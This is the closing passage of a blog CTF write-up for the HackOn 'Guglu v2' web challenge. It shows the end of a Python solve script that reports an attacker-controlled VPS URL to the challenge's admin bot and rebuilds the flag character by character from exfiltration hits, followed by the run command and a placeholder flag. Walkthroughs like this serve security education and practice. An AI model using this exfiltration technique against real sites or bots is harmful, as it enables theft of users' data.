<span class="mtk1">        </span><span class="mtk8 mtku">requests</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'</span><span class="mtk6">{</span><span class="mtk1">bot_url</span><span class="mtk6">}</span><span class="mtk4">/api/report'</span><span class="mtk1">, </span><span class="mtk9 mtki">json</span><span class="mtk5">=</span><span class="mtk1">{</span><span class="mtk4">'url'</span><span class="mtk1">: </span><span class="mtk1">vps_url</span><span class="mtk1">, </span><span class="mtk4">'chall_url'</span><span class="mtk1">: </span><span class="mtk1">victim_url</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk4">'/'</span><span class="mtk1">})</span>  

<span class="mtk1">        </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">c</span><span class="mtk1">, </span><span class="mtk1">count</span><span class="mtk1"> </span><span class="mtk7">in</span><span class="mtk1"> </span><span class="mtk1">hits</span><span class="mtk1">.</span><span class="mtk8">items</span><span class="mtk1">():</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">count</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">5</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk1">flag</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk1">c</span>
<span class="mtk1">                </span><span class="mtk5">break</span>
<span class="mtk1">        </span><span class="mtk5">else</span><span class="mtk1">:</span>
<span class="mtk1">            </span><span class="mtk1">flag</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk4">'}'</span>

<span class="mtk1">        </span><span class="mtk1">flag_progress</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk4">'H'</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">flag</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">flag</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'H'</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">flag</span>
<span class="mtk1">    </span><span class="mtk1">flag_progress</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk1">flag</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk8 mtku">os</span><span class="mtk1">.</span><span class="mtk8">_exit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">)</span>
</code></pre></div><h2 id="flag">Flag</h2><p>With this, we will obtain the flag after about 10 minutes, since the bot takes over 1 minute to finish:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> http://&lt;victim&gt;:3000 http://&lt;vps&gt;:8000 http://&lt;bot&gt;:1337  
[<span class="code-green">+</span>] Flag: HackOn{fakeflag}
</code></pre></div><p>The full script can be found in here: <a href="https://github.com/7Rocky/CTF-scripts/tree/main/HackOn%20CTF/Guglu%20v2/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#source-code-analysis">Source code analysis</a><ul><li><a href="#bot">Bot</a></li></ul></li><li><a href="#exfiltration-strategy">Exfiltration strategy</a><ul><li><a href="#intended-approach">Intended approach</a></li><li><a href="#verification">Verification</a></li><li><a href="#implementation">Implementation</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Receive a weekly blog digest"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p><p class="tc">powered by <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>